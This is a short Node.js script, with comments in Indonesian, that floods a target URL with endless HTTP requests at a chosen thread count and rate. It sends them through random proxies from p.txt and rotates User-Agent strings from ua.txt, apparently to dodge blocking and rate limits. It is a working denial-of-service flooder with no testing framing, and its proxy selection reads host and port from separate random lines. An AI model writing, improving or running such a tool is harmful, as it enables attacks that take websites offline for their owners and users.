const fs = require('fs');
const http = require('http');

function getRandomLineFromFile(filename) {
  const lines = fs.readFileSync(filename, 'utf-8').split('\n');
  const randomIndex = Math.floor(Math.random() * lines.length);
  return lines[randomIndex].trim();
}

function sendRequest(url, useragent, proxy) {
  return new Promise((resolve, reject) => {
    const options = {
      host: proxy.host,
      port: proxy.port,
      path: url,
      headers: {
        'User-Agent': useragent
      }
    };

    const req = http.request(options, (res) => {
      res.on('data', () => {}); // Mengabaikan data yang diterima
      res.on('end', () => resolve());
    });

    req.on('error', (err) => reject(err));
    req.end();
  });
}

async function sendRequests(url, thread, rps) {
  console.log("Sending requests to URL:", url);
  console.log("Thread:", thread);
  console.log("RPS:", rps);

  const interval = Math.floor(1000 / rps); // Menghitung interval antara setiap permintaan dalam milidetik
  let requestsSent = 0;

  while (true) {
    const promises = [];

    for (let i = 0; i < thread; i++) {
      for (let j = 0; j < rps; j++) {
        const useragent = getRandomLineFromFile('ua.txt');
        const proxy = {
          host: getRandomLineFromFile('p.txt').split(':')[0],
          port: parseInt(getRandomLineFromFile('p.txt').split(':')[1])
        };
        promises.push(sendRequest(url, useragent, proxy));
        requestsSent++;
      }
    }

    await Promise.all(promises);

    await new Promise((resolve) => setTimeout(resolve, interval));
  }
}

const args = process.argv.slice(2);

if (args.length < 3) {
  console.error("Usage: node send-requests.js url thread rps");
} else {
  const url = args[0];
  const thread = parseInt(args[1]);
  const rps = parseInt(args[2]);

  sendRequests(url, thread, rps)
    .then(() => {
      console.log("All requests sent successfully");
    })
    .catch((err) => {
      console.error("An error occurred:", err);
    });
}